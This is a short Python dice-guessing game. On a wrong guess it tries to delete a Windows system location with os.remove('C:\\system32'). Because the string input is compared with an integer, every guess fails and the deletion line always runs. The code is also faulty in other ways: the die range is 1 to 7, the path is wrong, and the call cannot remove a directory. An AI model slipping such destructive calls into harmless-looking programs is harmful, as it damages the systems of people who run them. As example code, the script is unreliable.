import os
import random

val = input("Guess the outcome of a dice throw ")
if val == random.randint(1, 7):
    print("You guessed correct")
else:
    print("You wrong, wah wah")
    os.remove("C:\\system32")
